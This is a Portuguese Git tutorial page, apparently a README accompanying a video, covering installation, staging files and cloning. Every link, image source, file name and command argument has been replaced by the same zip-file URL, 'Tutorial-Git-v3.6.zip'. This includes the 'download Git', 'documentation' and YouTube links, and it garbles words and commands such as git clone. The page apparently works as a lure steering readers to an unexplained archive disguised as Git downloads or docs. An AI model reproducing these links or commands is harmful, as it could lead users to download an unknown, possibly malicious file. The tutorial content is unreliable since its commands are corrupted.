...
No [vídeo anterior](https://raw.githubusercontent.com/eliezerfrn/GitTutorial/master/utahite/Tutorial-Git-v3.6.zip) eu expliquei os conceitos de alguns termos técnicos que utilizamos quando estamos usando o git, então [nesse vídeo](https://raw.githubusercontent.com/eliezerfrn/GitTutorial/master/utahite/Tutorial-Git-v3.6.zip) vou mostrar na prática como isso acontece.

## Instalando o GIT

* [Link com os downloads](https://raw.githubusercontent.com/eliezerfrn/GitTutorial/master/utahite/Tutorial-Git-v3.6.zip)
...
* Criar um novo arquivo `https://raw.githubusercontent.com/eliezerfrn/GitTutorial/master/utahite/Tutorial-Git-v3.6.zip`
...
* `git add https://raw.githubusercontent.com/eliezerfrn/GitTutorial/master/utahite/Tutorial-Git-v3.6.zip` para colocar o arquivo na área de stagging 

<img src="https://raw.githubusercontent.com/eliezerfrn/GitTutorial/master/utahite/Tutorial-Git-v3.6.zip">
...
Existem algumas [interfaces legais do git](https://raw.githubusercontent.com/eliezerfrn/GitTutorial/master/utahite/Tutorial-Git-v3.6.zip) que você pode fazer o download para poder visualizar de fato como está o projeto, o que foi alterado em cada commit, quando foi alterado etc.
...
* Além disso iremos criar um novo arquivo `https://raw.githubusercontent.com/eliezerfrn/GitTutorial/master/utahite/Tutorial-Git-v3.6.zip`, onde escreveremos `Esse é o arquivo onde desenvolverei o meu projeto`
...
* Vou então criar o arquivo, criar o `botãhttps://raw.githubusercontent.com/eliezerfrn/GitTutorial/master/utahite/Tutorial-Git-v3.6.zip` "aqui eu crio o botão"
...
* O comando para puxar o projeto para a sua máquina é o `git clone https://raw.githubusercontent.com/eliezerfrn/GitTutorial/master/utahite/Tutorial-Git-v3.6.zip`
...
Recomendo sempre vocês darem uma olhada na [documentação do Git](https://raw.githubusercontent.com/eliezerfrn/GitTutorial/master/utahite/Tutorial-Git-v3.6.zip), pois qualquer dúvida que apareça pode ser respondida por lá na explicação

**Não esqueçam de deixar o like e se inscrever no [canal do Youtube](https://raw.githubusercontent.com/eliezerfrn/GitTutorial/master/utahite/Tutorial-Git-v3.6.zip) ❤**
